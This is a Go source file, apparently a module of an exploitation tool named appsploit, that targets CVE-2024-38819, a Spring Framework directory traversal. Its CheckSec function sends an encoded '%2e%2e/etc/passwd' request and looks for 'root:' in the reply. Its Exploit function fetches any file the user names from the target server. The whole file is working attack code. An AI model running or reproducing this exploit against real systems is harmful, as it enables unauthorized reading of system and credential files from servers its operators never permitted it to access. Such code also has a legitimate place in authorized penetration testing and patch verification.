package vul

import (
	"appsploit/pkg/utils"
	appVul "appsploit/pkg/vul"
	"github.com/urfave/cli/v2"
	"strings"
)

type CVE_2024_38819 struct {
	appVul.BaseVulnerability
}

var CVE_2024_38819_v1 = CVE_2024_38819{
	BaseVulnerability: appVul.BaseVulnerability{
		Name:        "CVE-2024-38819",
		Description: "Spring Framework Directory Traversal - Type: Arbitrary File Read",
	},
}

func (cve CVE_2024_38819) CheckSec(ctx *cli.Context) (bool, error) {
	baseURL := utils.Http.FormatURL(ctx)
	filename := "/%2e%2e/etc/passwd"
	urlPath := ctx.String("path")
	if !strings.HasSuffix(urlPath, "/") {
		filename = "%2e%2e/etc/passwd"
	}
	if resp, err := utils.Http.Get(baseURL + urlPath + filename); err != nil {
		return false, err
	} else {
		if strings.Contains(resp, "root:") {
			CVE_2024_38819_v1.VulnerabilityExists = true
			CVE_2024_38819_v1.VulnerabilityResponse = "vulnerability is exists"
		} else {
			CVE_2024_38819_v1.VulnerabilityExists = false
		}
	}
	return CVE_2024_38819_v1.VulnerabilityExists, error(nil)
}

func (cve CVE_2024_38819) Exploit(ctx *cli.Context) (bool, error) {
	baseURL := utils.Http.FormatURL(ctx)
	filename := ctx.String("file")
	urlPath := ctx.String("path")
	if !strings.HasSuffix(urlPath, "/") {
		filename = "%2e%2e" + filename
	} else {
		filename = "/%2e%2e" + filename
	}
	filename = strings.ReplaceAll(filename, "/","%2f")
	if vulnerabilityExists, err := cve.CheckSec(ctx); err != nil {
		return CVE_2024_38819_v1.VulnerabilityExists, err
	} else {
		if vulnerabilityExists {
			httpClient := *utils.Http.Client()
			if resp, err := httpClient.Get(baseURL + urlPath + filename); err != nil {
				CVE_2024_38819_v1.VulnerabilityExists = false
				return CVE_2024_38819_v1.VulnerabilityExists, err
			} else {
				CVE_2024_38819_v1.VulnerabilityResponse = resp.String()
			}
		}
	}
	return CVE_2024_38819_v1.VulnerabilityExists, error(nil)
}
